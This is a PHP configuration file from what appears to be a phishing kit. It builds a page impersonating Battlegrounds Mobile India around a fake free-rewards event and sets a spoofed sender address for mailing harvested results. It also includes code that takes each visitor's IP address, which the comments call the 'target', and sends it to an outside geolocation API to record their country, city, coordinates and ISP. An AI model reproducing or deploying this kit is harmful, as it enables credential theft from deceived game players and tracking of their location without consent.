<?php
// SCRIPT BY ARPANTEK
// COPYRIGHT Â©ï¸ ITS ME ARPANTEK
// HARGAI W OK, JANGAN LO UBAH COPYRIGHT NYA

// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK MENDAPATKAN INFORMASI TAHUN SAAT INI (UNTUK DITAMPILKAN DIBAGIAN FOOTER HALAMAN)
$yearNow = date('Y');

// KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'BATTLEGROUNDS MOBILE INDIA';
$description = 'Collect your special rewards at the Noctum Sunder event. This opportunity is limited and without the need for topup. Collect your rewards now!';
$copyright = 'BATTLEGROUNDS MOBILE INDIA';
$theme = '#000';
$image = 'https://www.battlegroundsmobileindia.com/common/img/thum.jpg';
$icon = 'https://www.battlegroundsmobileindia.com/common/img/favicon.ico';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = '';
$sender = 'From: ðŸ”°BGMI DAYAðŸ”° <bgmi@data.com>';

// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}

// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
$url = "https://api.sewatthoster.id/api/?ip=".getClientIP();

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($curl);
		curl_close($curl);
$data = json_decode($resp,true);

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$arpantek_ip_address = getClientIP();
$arpantek_continent = $data['benua'];
$arpantek_flag = $data['flag01'];
$arpantek_country = $data['negara'];
$arpantek_countrycode = $data['countryCode'];
$arpantek_province = $data['provinsi'];
$arpantek_city = $data['kota'];
$arpantek_callcode = $data['callcode'];
$arpantek_latitude = $data['latitude'];
$arpantek_longitude = $data['longitude'];
$arpantek_isp = $data['isp'];
?>